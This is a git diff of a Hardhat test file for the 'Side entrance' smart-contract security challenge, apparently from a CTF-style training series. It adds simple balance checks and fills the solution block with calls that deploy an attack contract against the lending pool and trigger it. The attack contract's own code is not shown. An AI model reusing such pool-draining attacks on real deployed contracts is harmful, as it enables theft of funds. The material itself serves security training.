@@ -23,10 +23,33 @@ describe('[Challenge] Side entrance', function () {
         expect(await ethers.provider.getBalance(player.address)).to.eq(PLAYER_INITIAL_ETH_BALANCE);
 
     });
+              //Test-Cases
+              
+    it("Balance of pool", async function () {
+        expect(await ethers.provider.getBalance(pool.address)).to.equal(
+            ETHER_IN_POOL
+          );
+      });
+      it("Balance of player", async function () {
+        expect(await ethers.provider.getBalance(player.address)).to.eq(
+            PLAYER_INITIAL_ETH_BALANCE
+          );
+      });
+      it("Not zero Balance", async function () {
+        expect(await ethers.provider.getBalance(pool.address)).to.be.gt(
+            0
+          );
+      });
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
-    });
+       
+           this.attackContract=await(await ethers.getContractFactory("Attack_side_entrance",player)).deploy(pool.address, player.address);  
+           await this.attackContract.attack();    
+        });
+        
+
+
 
     after(async function () {
         /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
